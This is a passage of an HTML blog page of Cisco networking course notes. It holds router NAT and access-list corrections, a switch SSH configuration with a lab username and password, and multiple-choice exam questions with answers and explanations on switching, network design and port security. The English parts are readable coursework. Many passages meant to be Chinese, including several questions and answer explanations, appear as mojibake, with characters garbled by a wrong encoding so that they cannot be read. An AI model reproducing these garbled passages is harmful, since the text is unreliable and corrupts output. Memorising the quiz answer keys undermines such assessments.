class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//Correct the Interfaces.</span><br><span class="hljs-comment">//Assign the ip nat inside and ip nat outside commands to the correct ports.</span><br><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span># interface Serial0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># ip nat outside<br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># interface Serial0/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># ip nat inside<br><br><span class="hljs-comment">//Correct the Access-list.</span><br><span class="hljs-comment">//Delete access-list 101 and replace it with a similar list that is also one statement in length. The only difference should be the wildcard.</span><br><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span># no access-<span class="hljs-built_in">list</span> <span class="hljs-number">101</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span># access-<span class="hljs-built_in">list</span> <span class="hljs-number">101</span> permit ip <span class="hljs-number">10.4</span>.<span class="hljs-number">10.0</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">1.255</span> any<br></code></pre></td></tr></table></figure><h3 id="9-4-1-2"><a href="#9-4-1-2" class="headerlink" title="9.4.1.2"></a>9.4.1.2</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">Switch</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#host</span> HQ-SW<br><span class="hljs-function"><span class="hljs-title">HQ-SW</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> domain-name cisco.com<br><span class="hljs-function"><span class="hljs-title">HQ-SW</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#crypto</span> key generate rsa<br>How many bits <span class="hljs-keyword">in</span> the modulus <span class="hljs-selector-attr">[512]</span>: <span class="hljs-number">1024</span><br><span class="hljs-function"><span class="hljs-title">HQ-SW</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#username</span> HQadmin password ciscoclass<br><span class="hljs-function"><span class="hljs-title">HQ-SW</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> ssh version <span class="hljs-number">2</span><br><span class="hljs-function"><span class="hljs-title">HQ-SW</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> ssh authentication-retries <span class="hljs-number">2</span><br><span class="hljs-function"><span class="hljs-title">HQ-SW</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> ssh time-out <br><span class="hljs-function"><span class="hljs-title">HQ-SW</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#line</span> vty <span class="hljs-number">0</span> <span class="hljs-number">15</span><br><span class="hljs-function"><span class="hljs-title">HQ-SW</span><span class="hljs-params">(config-line)</span></span><span class="hljs-selector-id">#login</span> local<br><span class="hljs-function"><span class="hljs-title">HQ-SW</span><span class="hljs-params">(config-line)</span></span><span class="hljs-selector-id">#transport</span> <span class="hljs-selector-tag">input</span> ssh<br><span class="hljs-function"><span class="hljs-title">HQ-SW</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#service</span> password-encryption <br></code></pre></td></tr></table></figure><h2 id="è€ƒé¢˜è®°å½•"><a href="#è€ƒé¢˜è®°å½•" class="headerlink" title="è€ƒé¢˜è®°å½•"></a>è€ƒé¢˜è®°å½•</h2><blockquote><p>ospfç®¡ç†è·ç¦»ä¸º110</p></blockquote><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200303201755734.png" class="" title="image-20200303201755734"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200303202527458.png" class="" title="image-20200303202527458"><p>DNS 53ç«¯å£ å³æ˜¯UDPä¹Ÿæ˜¯TCP</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200326091219029.png" class="" title="image-20200326091219029"><blockquote><p>What happens to a static route entry in a routing table when the outgoing interface is not available?<br><strong>The route is removed from the table.</strong></p></blockquote><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200409112857408.png" class="" title="image-20200409112857408"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415131256177.png" class="" title="image-20200415131256177"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415131821432.png" class="" title="image-20200415131821432"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415131935464.png" class="" title="image-20200415131935464"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415132300377.png" class="" title="image-20200415132300377"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415132637432.png" class="" title="image-20200415132637432"><p>åŒ¹é…æœ€é•¿</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415132753057.png" class="" title="image-20200415132753057"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415132849136.png" class="" title="image-20200415132849136"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415132945261.png" class="" title="image-20200415132945261"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415133009739.png" class="" title="image-20200415133009739"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415133124039.png" class="" title="image-20200415133124039"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415133146490.png" class="" title="image-20200415133146490"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415133211622.png" class="" title="image-20200415133211622"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415133305998.png" class="" title="image-20200415133305998"><blockquote><p>æ¨¡å—åŒ–äº¤æ¢æœºé€šè¿‡ä½¿ç”¨çº¿è·¯å¡æä¾›äº†å®¹é”™å’Œå¸¦å®½å¯ç”¨æ€§ä¸å°†æ¥æ‰©å±•çš„åŠŸèƒ½ï¼Œä½†å®æ–½æˆæœ¬éå¸¸æ˜‚è´µã€‚å †å å¼äº¤æ¢æœºé€šè¿‡åœ¨äº¤æ¢æœºä¹‹é—´ä½¿ç”¨ç‰¹æ®Šç”µç¼†æä¾›å®¹é”™å’Œå¸¦å®½å¯ç”¨æ€§ï¼Œå¹¶ä¸”æ¯”æ¨¡å—åŒ–äº¤æ¢æœºçš„å®æ–½æˆæœ¬ä½ã€‚éå †å å¼äº¤æ¢æœºä¸æä¾›è¿™äº›åŠŸèƒ½ã€‚å›ºå®šé…ç½®äº¤æ¢æœºæ˜¯ä¸æ”¯æŒè‡ªå¸¦åŠŸèƒ½ä»¥å¤–åŠŸèƒ½çš„å•ä¸ªäº¤æ¢æœºã€‚</p></blockquote><p>äº¤æ¢æœºåˆ†å±‚è®¾è®¡æ¨¡å‹æœ‰å“ªä¸‰å±‚ï¼Ÿ</p><blockquote><p>æ¥å…¥å±‚æ˜¯æœ€ä½å±‚ï¼Œå®ƒä¸ºç”¨æˆ·æä¾›ç½‘ç»œè®¿é—®ã€‚åˆ†å¸ƒå±‚å…·æœ‰å¾ˆå¤šåŠŸèƒ½ï¼Œä½†æ˜¯å®ƒèšåˆæ¥å…¥å±‚çš„æ•°æ®ï¼Œæä¾›è¿‡æ»¤ã€ç­–ç•¥æ§åˆ¶å¹¶è®¾ç½®ç¬¬ 3 å±‚è·¯ç”±è¾¹ç•Œã€‚æ ¸å¿ƒå±‚æä¾›é«˜é€Ÿè¿æ¥ã€‚</p></blockquote><blockquote><p>ä¸ºæé«˜æ•ˆç‡ã€å¯æ‰©å±•æ€§å’Œæˆæœ¬æ•ˆç›Šï¼Œå»ºè®®å»ºç«‹ä»ä¸€ä¸ªä¸­å¿ƒç«™ç‚¹åˆ°æ‰€æœ‰å…¶ä»–å›­åŒºç«™ç‚¹çš„æ‰©å±•æ˜Ÿå‹æ‹“æ‰‘ã€‚ç½‘çŠ¶æ‹“æ‰‘æ›´æ˜‚è´µï¼Œæ€»çº¿å’ŒåŒç¯æ‹“æ‰‘æ›´éš¾è¿›è¡Œæ•…éšœæ’é™¤å’Œç»´æŠ¤ã€‚</p></blockquote><p>ç½‘ç»œè®¾è®¡å¸ˆä½•æ—¶ä¼šå…³æ³¨ RUï¼Ÿ</p><p>ä½•æ—¶è€ƒè™‘ç«¯å£å¯†åº¦<br>ä½•æ—¶è®¡ç®—æœ€å¤§ç«¯å£é€Ÿåº¦<br>ä½•æ—¶ç¡®å®šå¯ç”¨çš„çº¿å¡æ•°é‡<br>ä½•æ—¶è´­ä¹°ç”¨äºç½‘ç»œæœºæ¶çš„ç‰¹å®šæ•°é‡çš„äº¤æ¢æœº</p><blockquote><p>æœºæ¶å•å…ƒæˆ– RU æ˜¯ä¸äº¤æ¢æœºé«˜åº¦ç›¸å…³çš„ä¸€é¡¹ç‰¹å®šæµ‹é‡ã€‚1 RU äº¤æ¢æœºçš„é¢å®šå€¼å°äº 2 RU äº¤æ¢æœºçš„é¢å®šå€¼ã€‚ç«¯å£å¯†åº¦æµ‹é‡äº¤æ¢æœºä¸Šçš„ç«¯å£æ•°ã€‚æ¨¡å—åŒ–å½±å“å¯ç”¨çº¿å¡çš„æ•°é‡ã€‚ç«¯å£é€Ÿåº¦æµ‹é‡å¯æµè¿‡ç»™å®šç«¯å£çš„æ¯ç§’æ¯”ç‰¹æ•°ã€‚</p><p>æ­£ç¡®ç­”æ¡ˆæ˜¯ï¼šä½•æ—¶è´­ä¹°ç”¨äºç½‘ç»œæœºæ¶çš„ç‰¹å®šæ•°é‡çš„äº¤æ¢æœº</p></blockquote><p>èåˆç½‘ç»œä¸­çš„è‡ªåŠ¨è¯åŠ¡å‘˜åŠŸèƒ½æä¾›ä»€ä¹ˆæœåŠ¡ï¼Ÿ</p><p>ç‚¹å¯¹ç‚¹è§†é¢‘<br>å‘¼å«è·¯ç”±<br>IT ç®¡ç†æ¥å£<br>è§†é¢‘ä¼šè®®</p><blockquote><p>è‡ªåŠ¨è¯åŠ¡å‘˜åŠŸèƒ½é€šè¿‡å°†å‘¼å«ç›´æ¥è·¯ç”±åˆ°ä¸ªäººæˆ–éƒ¨é—¨ï¼Œä»è€ŒåŠ å¿«è¯­éŸ³æœåŠ¡çš„é€Ÿåº¦ã€‚ç‚¹å¯¹ç‚¹è§†é¢‘å’Œè§†é¢‘ä¼šè®®è¯´æ˜äº†èåˆç½‘ç»œä¸­çš„è§†é¢‘æœåŠ¡ã€‚IT ç®¡ç†æ¥å£æ˜¯èåˆç½‘ç»œè§£å†³æ–¹æ¡ˆçš„ä¸€éƒ¨åˆ†ï¼Œèƒ½å¤Ÿè®© IT äººå‘˜é€šè¿‡ç»Ÿä¸€åº”ç”¨æ‰§è¡Œç§»åŠ¨ã€æ·»åŠ å’Œæ›´æ”¹ç­‰æ“ä½œã€‚</p></blockquote><p>æ­£ç¡®ç­”æ¡ˆæ˜¯ï¼šå‘¼å«è·¯ç”±</p><p>å“ªä¸¤ä¸ªç‰¹å¾æè¿°äº†èåˆç½‘ç»œï¼Ÿï¼ˆè¯·é€‰æ‹©ä¸¤é¡¹ã€‚ï¼‰</p><p>é™ä½äº†æœåŠ¡å‘¼å«<br>ä½¿ç”¨ç›¸åŒçš„äº¤æ¢æœºæ”¯æŒè¯­éŸ³å’Œè§†é¢‘<br>è¯­éŸ³å’Œè§†é¢‘æµé‡çš„å•ç‹¬å¸ƒçº¿åŸºç¡€è®¾æ–½<br>ä¸­å°å‹ä¼ä¸šçš„å¯è´Ÿæ‹…æ€§<br>æ›´ä½çš„è®¾å¤‡æˆæœ¬</p><blockquote><p>èåˆç½‘ç»œå…·æœ‰ä¼ ç»Ÿçš„ç”¨æˆ·æµé‡ä»¥åŠæ•°å­—åŒ–è¯­éŸ³å’Œè§†é¢‘æµé‡ï¼Œè¿™äº›æµé‡ä»¥å‰éœ€è¦å•ç‹¬çš„ç½‘ç»œã€‚ç°åœ¨ï¼Œä¸å†æ˜¯å•ç‹¬çš„ç»„ç®¡ç†å•ç‹¬çš„ç½‘ç»œï¼Œä¸€ç»„äººå‘˜å³å¯ç®¡ç†ç½‘ç»œã€‚</p></blockquote><p>æ­£ç¡®ç­”æ¡ˆæ˜¯ï¼šä½¿ç”¨ç›¸åŒçš„äº¤æ¢æœºæ”¯æŒè¯­éŸ³å’Œè§†é¢‘, ä¸­å°å‹ä¼ä¸šçš„å¯è´Ÿæ‹…æ€§</p><h3 id="What-type-of-network-uses-one-common-infrastructure-to-carry-voice-data-and-video-signals"><a href="#What-type-of-network-uses-one-common-infrastructure-to-carry-voice-data-and-video-signals" class="headerlink" title="What type of network uses one common infrastructure to carry voice, data, and video signals?"></a>What type of network uses one common infrastructure to carry voice, data, and video signals?</h3><ul><li><p>switched</p></li><li><p>borderless</p></li><li><p>converged</p></li><li><p>managed</p><blockquote><p><strong>Explanation:</strong>A converged network has only one physical network to install and manage. This results in substantial savings over the installation and management of separate voice, video, and data networks.</p></blockquote></li></ul><h3 id="Which-solution-would-help-a-college-alleviate-network-congestion-due-to-collisions"><a href="#Which-solution-would-help-a-college-alleviate-network-congestion-due-to-collisions" class="headerlink" title="Which solution would help a college alleviate network congestion due to collisions?"></a>Which solution would help a college alleviate network congestion due to collisions?</h3><ul><li><p>a firewall that connects to two Internet providers</p></li><li><p>a high port density switch</p></li><li><p>a router with two Ethernet ports</p></li><li><p>a router with three Ethernet ports</p><blockquote><p><strong>Explanation:</strong>Switches provide microsegmentation so that one device does not compete for the same Ethernet network bandwidth with another network device, thus practically eliminating collisions. A high port density switch provides very fast connectivity for many devices.</p></blockquote></li></ul><p>alleviateï¼šå‡è½»</p><p>congestionï¼šæ‹¥å¡</p><p>collisionsï¼šç¢°æ’</p><h3 id="What-is-a-basic-function-of-the-Cisco-Borderless-Architecture-distribution-layer"><a href="#What-is-a-basic-function-of-the-Cisco-Borderless-Architecture-distribution-layer" class="headerlink" title="What is a basic function of the Cisco Borderless Architecture distribution layer?"></a>What is a basic function of the Cisco Borderless Architecture distribution layer?</h3><ul><li><p>acting as a backbone</p></li><li><p>aggregating all the campus blocks</p></li><li><p>aggregating Layer 3 routing boundaries</p></li><li><p>providing access to end user devices</p><blockquote><p><strong>Explanation:</strong>One of the basic functions of the distribution layer of the Cisco Borderless Architecture is to perform routing between different VLANs. Acting as a backbone and aggregating campus blocks are functions of the core layer. Providing access to end user devices is a function of the access layer.</p></blockquote></li></ul><h3 id="A-network-designer-must-provide-a-rationale-to-a-customer-for-a-design-which-will-move-an-enterprise-from-a-flat-network-topology-to-a-hierarchical-network-topology-Which-two-features-of-the-hierarchical-design-make-it-the-better-choice-Choose-two"><a href="#A-network-designer-must-provide-a-rationale-to-a-customer-for-a-design-which-will-move-an-enterprise-from-a-flat-network-topology-to-a-hierarchical-network-topology-Which-two-features-of-the-hierarchical-design-make-it-the-better-choice-Choose-two" class="headerlink" title="A network designer must provide a rationale to a customer for a design which will move an enterprise from a flat network topology to a hierarchical network topology. Which two features of the hierarchical design make it the better choice? (Choose two.)"></a>A network designer must provide a rationale to a customer for a design which will move an enterprise from a flat network topology to a hierarchical network topology. Which two features of the hierarchical design make it the better choice? (Choose two.)</h3><ul><li><p>lower bandwidth requirements</p></li><li><p>reduced cost for equipment and user training</p></li><li><p>easier to provide redundant links to ensure higher availability</p></li><li><p>less required equipment to provide the same performance levels</p></li><li><p>simpler deployment for additional switch equipment</p><blockquote><p><strong>Explanation:</strong>A hierarchical design for switches helps network administrators when planning and deploying a network expansion, performing fault isolation when a problem occurs, and providing resiliency when traffic levels are high. A good hierarchical design has redundancy when it can be afforded so that one switch does not cause all networks to be down.</p></blockquote></li></ul><h3 id="What-does-the-term-â€œport-densityâ€-represent-for-an-Ethernet-switch"><a href="#What-does-the-term-â€œport-densityâ€-represent-for-an-Ethernet-switch" class="headerlink" title="What does the term â€œport densityâ€ represent for an Ethernet switch?"></a>What does the term â€œport densityâ€ represent for an Ethernet switch?</h3><ul><li><p>the memory space that is allocated to each switch port</p></li><li><p>the number of available ports</p></li><li><p>the numbers of hosts that are connected to each switch port</p></li><li><p>the speed of each port</p><blockquote><p><strong>Explanation:</strong>The term port density represents the number of ports available in a switch. A one rack unit access switch can have up to 48 ports. Larger switches may support hundreds of ports.</p></blockquote></li></ul><h3 id="What-is-a-definition-of-a-two-tier-LAN-network-design"><a href="#What-is-a-definition-of-a-two-tier-LAN-network-design" class="headerlink" title="What is a definition of a two-tier LAN network design?"></a>What is a definition of a two-tier LAN network design?</h3><ul><li><p>access and core layers collapsed into one tier, and the distribution layer on a separate tier</p></li><li><p>access and distribution layers collapsed into one tier, and the core layer on a separate tier</p></li><li><p>distribution and core layers collapsed into one tier, and the access layer on a separate tier</p></li><li><p>access, distribution, and core layers collapsed into one tier, with a separate backbone layer</p><blockquote><p><strong>Explanation:</strong>Maintaining three separate network tiers is not always required or cost-efficient. All network designs require an access layer, but a two-tier design can collapse the distribution and core layers into one layer to serve the needs of a small location with few users.</p></blockquote></li></ul><h3 id="What-are-two-reasons-a-network-administrator-would-segment-a-network-with-a-Layer-2-switch-Choose-two"><a href="#What-are-two-reasons-a-network-administrator-would-segment-a-network-with-a-Layer-2-switch-Choose-two" class="headerlink" title="What are two reasons a network administrator would segment a network with a Layer 2 switch? (Choose two.)"></a>What are two reasons a network administrator would segment a network with a Layer 2 switch? (Choose two.)</h3><ul><li><p>to create fewer collision domains</p></li><li><p>to enhance user bandwidth</p></li><li><p>to create more broadcast domains</p></li><li><p>to eliminate virtual circuits</p></li><li><p>to isolate traffic between segments</p></li><li><p>to isolate ARP request messages from the rest of the network</p><blockquote><p><strong>Explanation:</strong>A switch has the ability of creating temporary point-to-point connections between the directly-attached transmitting and receiving network devices. The two devices have full-bandwidth full-duplex connectivity during the transmission.</p></blockquote></li></ul><blockquote><p>A collapsed core design is appropriate for a small, single building business. This type of design uses two layers (the collapsed core and distribution layers consolidated into one layer and the access layer). Larger businesses use the traditional three-tier switch design model</p></blockquote><h3 id="Which-statement-describes-a-result-after-multiple-Cisco-LAN-switches-are-interconnected"><a href="#Which-statement-describes-a-result-after-multiple-Cisco-LAN-switches-are-interconnected" class="headerlink" title="Which statement describes a result after multiple Cisco LAN switches are interconnected?"></a>Which statement describes a result after multiple Cisco LAN switches are interconnected?</h3><ul><li><p>The broadcast domain expands to all switches.</p></li><li><p>One collision domain exists per switch.</p></li><li><p>Frame collisions increase on the segments connecting the switches.</p></li><li><p>There is one broadcast domain and one collision domain per switch.</p><blockquote><p><strong>Explanation:</strong>In Cisco LAN switches, the microsegmentation makes it possible for each port to represent a separate segment and thus each switch port represents a separate collision domain. This fact will not change when multiple switches are interconnected. However, LAN switches do not filter broadcast frames. A broadcast frame is flooded to all ports. Interconnected switches form one big broadcast domain.</p></blockquote></li></ul><h3 id="What-are-two-advantages-of-modular-switches-over-fixed-configuration-switches-Choose-two"><a href="#What-are-two-advantages-of-modular-switches-over-fixed-configuration-switches-Choose-two" class="headerlink" title="What are two advantages of modular switches over fixed-configuration switches? (Choose two.)"></a>What are two advantages of modular switches over fixed-configuration switches? (Choose two.)</h3><ul><li><p>lower cost per switch</p></li><li><p>increased scalability</p></li><li><p>lower forwarding rates</p></li><li><p>need for fewer power outlets</p></li><li><p>availability of multiple ports for bandwidth aggregation</p><blockquote><p><strong>Explanation:</strong>Fixed-configuration switches, although lower in price, have a designated number of ports and no ability to add ports. They also typically provide fewer high-speed ports. In order to scale switching on a network that consists of fixed-configuration switches, more switches need to be purchased. This increases the number of power outlets that need to be used. Modular switches can be scaled simply by purchasing additional line cards. Bandwidth aggregation is also easier, because the backplane of the chassis can provide the bandwidth that is needed for the switch port line cards.</p></blockquote></li></ul><h3 id="What-two-criteria-are-used-by-a-Cisco-LAN-switch-to-decide-how-to-forward-Ethernet-frames-Choose-two"><a href="#What-two-criteria-are-used-by-a-Cisco-LAN-switch-to-decide-how-to-forward-Ethernet-frames-Choose-two" class="headerlink" title="What two criteria are used by a Cisco LAN switch to decide how to forward Ethernet frames? (Choose two.)"></a>What two criteria are used by a Cisco LAN switch to decide how to forward Ethernet frames? (Choose two.)</h3><ul><li><p>path cost</p></li><li><p>egress port</p></li><li><p>ingress port</p></li><li><p>destination IP address</p></li><li><p>destination MAC address</p><blockquote><p><strong>Explanation:</strong>Cisco LAN switches use the MAC address table to make decisions of traffic forwarding. The decisions are based on the ingress port and the destination MAC address of the frame. The ingress port information is important because it carries the VLAN to which the port belongs.</p></blockquote></li></ul><h3 id="What-is-one-function-of-a-Layer-2-switch"><a href="#What-is-one-function-of-a-Layer-2-switch" class="headerlink" title="What is one function of a Layer 2 switch?"></a>What is one function of a Layer 2 switch?</h3><ul><li><p>forwards data based on logical addressing</p></li><li><p>duplicates the electrical signal of each frame to every port</p></li><li><p>learns the port assigned to a host by examining the destination MAC address</p></li><li><p>determines which interface is used to forward a frame based on the destination MAC address</p><blockquote><p><strong>Explanation:</strong>A switch builds a MAC address table of MAC addresses and associated port numbers by examining the source MAC address found in inbound frames. To forward a frame onward, the switch examines the destination MAC address, looks in the MAC address for a port number associated with that destination MAC address, and sends it to the specific port. If the destination MAC address is not in the table, the switch forwards the frame out all ports except the inbound port that originated the frame.</p></blockquote></li></ul><h3 id="Which-network-device-can-be-used-to-eliminate-collisions-on-an-Ethernet-network"><a href="#Which-network-device-can-be-used-to-eliminate-collisions-on-an-Ethernet-network" class="headerlink" title="Which network device can be used to eliminate collisions on an Ethernet network?"></a>Which network device can be used to eliminate collisions on an Ethernet network?</h3><ul><li><p>firewall</p></li><li><p>hub</p></li><li><p>router</p></li><li><p>switch</p><blockquote><p><strong>Explanation:</strong>A switch provides microsegmentation so that no other device competes for the same Ethernet network bandwidth.</p></blockquote></li></ul><h3 id="What-is-the-destination-address-in-the-header-of-a-broadcast-frame"><a href="#What-is-the-destination-address-in-the-header-of-a-broadcast-frame" class="headerlink" title="What is the destination address in the header of a broadcast frame?"></a>What is the destination address in the header of a broadcast frame?</h3><p>FF-FF-FF-FF-FF-FF</p><blockquote><p>A converged network provides a single infrastructure that combines voice, video, and data. Analog phones, user data, and point-to-point video traffic are all contained within the single network infrastructure of a converged network.</p></blockquote><p>æ‰“å¼€äº¤æ¢æœºæ—¶ï¼Œå¯åŠ¨é¡ºåºä¸­çš„ç¬¬ä¸€ä¸ªæ“ä½œæ˜¯ä»€ä¹ˆï¼Ÿ</p><p>A. åŠ è½½é»˜è®¤ Cisco IOS è½¯ä»¶</p><p>B. åŠ è½½å¯åŠ¨åŠ è½½å™¨è½¯ä»¶</p><p>C. ä½çº§ CPU åˆå§‹åŒ–</p><p>D. åŠ è½½åŠ ç”µè‡ªæ£€ç¨‹åº</p><blockquote><p><strong>ç­”æ¡ˆ</strong></p><p>D. äº¤æ¢æœºå¯åŠ¨åçš„ç¬¬ä¸€ä¸ªæ“ä½œæ˜¯ POSTï¼ˆåŠ ç”µè‡ªæ£€ï¼‰ã€‚POST å¯¹ CPUã€å†…å­˜å’Œé—ªå­˜è¿›è¡Œæµ‹è¯•ï¼Œä»¥å‡†å¤‡åŠ è½½å¯åŠ¨åŠ è½½å™¨ã€‚</p></blockquote><p>ç½‘ç»œç®¡ç†å‘˜é…ç½®äº† VLAN 99 ä½œä¸ºç®¡ç† VLANï¼Œå¹¶ä¸ºå…¶é…ç½® IP åœ°å€å’Œå­ç½‘æ©ç ã€‚ç®¡ç†å‘˜å‘å‡º show interface vlan 99 å‘½ä»¤å¹¶æ³¨æ„åˆ°çº¿è·¯åè®®å¤„äºå…³é—­çŠ¶æ€ã€‚ä»¥ä¸‹å“ªé¡¹æ“ä½œå¯ä»¥å°†çº¿è·¯åè®®çš„çŠ¶æ€æ›´æ”¹ä¸ºå¼€å¯ï¼Ÿ</p><p>A. å°†ä¸»æœºè¿æ¥åˆ°ä¸ VLAN 99 ç›¸å…³è”çš„æ¥å£</p><p>B. é…ç½®é»˜è®¤ç½‘å…³</p><p>C. ä» VLAN 99 ä¸­åˆ é™¤æ‰€æœ‰æ¥å…¥ç«¯å£</p><p>D. åœ¨ vty çº¿è·¯ä¸Šé…ç½®ä¼ è¾“è¾“å…¥æ³•</p><blockquote><p><strong>ç­”æ¡ˆ</strong></p><p>A. ä¸€æ—¦ SVI é…ç½®äº† IP åœ°å€å’Œå­ç½‘æ©ç ï¼Œå³å¯ç”¨äºè¿œç¨‹ç®¡ç†ã€‚å½“ SVI VLAN æœ‰ä¸€ä¸ªæ´»åŠ¨ç«¯å£ä¸ä¹‹å…³è”æ—¶ï¼ŒSVI æ¥å£å¤„äºæ´»åŠ¨çŠ¶æ€ã€‚</p></blockquote><p>æ”»å‡»è€…å·²ç»ç»•è¿‡ç‰©ç†å®‰å…¨å¹¶ä¸”å¯ä»¥å°†ç¬”è®°æœ¬ç”µè„‘è¿æ¥åˆ°äº¤æ¢æœºä¸Šçš„ä»¥å¤ªç½‘æ¥å£ã€‚å¦‚æœæ‰€æœ‰äº¤æ¢æœºç«¯å£éƒ½é…ç½®äº†ç«¯å£å®‰å…¨ï¼Œå¹¶ä¸”è¿è§„æ¨¡å¼è®¾ç½®ä¸ºå‡ºå‚é»˜è®¤è®¾ç½®ï¼Œåˆ™é’ˆå¯¹æ”»å‡»è€…é‡‡å–å“ªé¡¹æ“ä½œï¼Ÿ</p><p>A. å…·æœ‰æœªçŸ¥æºåœ°å€çš„æ•°æ®åŒ…è¢«ä¸¢å¼ƒï¼Œå¹¶ä¸”æ²¡æœ‰å·²å‘ç”Ÿå®‰å…¨è¿è§„çš„é€šçŸ¥ã€‚ã€‚</p><p>B. å…·æœ‰æœªçŸ¥æºåœ°å€çš„æ•°æ®åŒ…è¢«ä¸¢å¼ƒï¼Œå¹¶ä¸”æœ‰å·²å‘ç”Ÿå®‰å…¨è¿è§„çš„é€šçŸ¥ã€‚</p><p>C. å…·æœ‰æœªçŸ¥æºåœ°å€çš„æ•°æ®åŒ…è¢«ä¸¢å¼ƒï¼Œå¹¶ä¸”æ¥å£è¿›å…¥é”™è¯¯ç¦ç”¨çŠ¶æ€å¹¶å…³é—­ç«¯å£ LEDã€‚</p><p>D. å…·æœ‰æœªçŸ¥æºåœ°å€çš„æ•°æ®åŒ…è¢«è½¬å‘ï¼Œå¹¶ä¸”ä¼šå‘ syslog æœåŠ¡å™¨å‘é€é€šçŸ¥ã€‚</p><blockquote><p><strong>ç­”æ¡ˆ</strong></p><p>C. é»˜è®¤è¿è§„æ¨¡å¼å·²å…³é—­ã€‚åœ¨æ­¤æ¨¡å¼ä¸‹ï¼Œç«¯å£å®‰å…¨è¿è§„å°†é€ æˆæ¥å£ç«‹å³å˜ä¸ºé”™è¯¯ç¦ç”¨ (error-disabled) çŠ¶æ€ï¼Œå¹¶å…³é—­ç«¯å£ LEDã€‚è¯¥æ¨¡å¼è¿˜ä¼šå‘é€ SNMP é™·é˜±ã€å°† syslog æ¶ˆæ¯è®°å…¥æ—¥å¿—ï¼Œä»¥åŠé€æ¸å¢åŠ è¿è§„è®¡æ•°å™¨çš„è®¡æ•°ã€‚</p></blockquote><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/download.png" class="" title="i291241n1v4.png"><p>ä¼¼ä¹æ˜¯äº¤æ¢æœºçš„é»˜è®¤é…ç½®ã€‚</p><p>ä½¿ç”¨äº¤æ¢æœºæ—¶ï¼Œé€ æˆä¸å®Œå…¨ä»¥å¤ªç½‘å¸§çš„æ½œåœ¨åŸå› æ˜¯ä»€ä¹ˆï¼Ÿ</p><p>A. åŒå·¥é…ç½®é”™è¯¯</p><p>B. çº¿ç¼†è¿‡é•¿</p><p>C. å»¶è¿Ÿå†²çª</p><p>D. NIC æ•…éšœ</p><blockquote><p><strong>ç­”æ¡ˆ</strong></p><p>D. ä¸å®Œå…¨å¸§å³å°äº 64 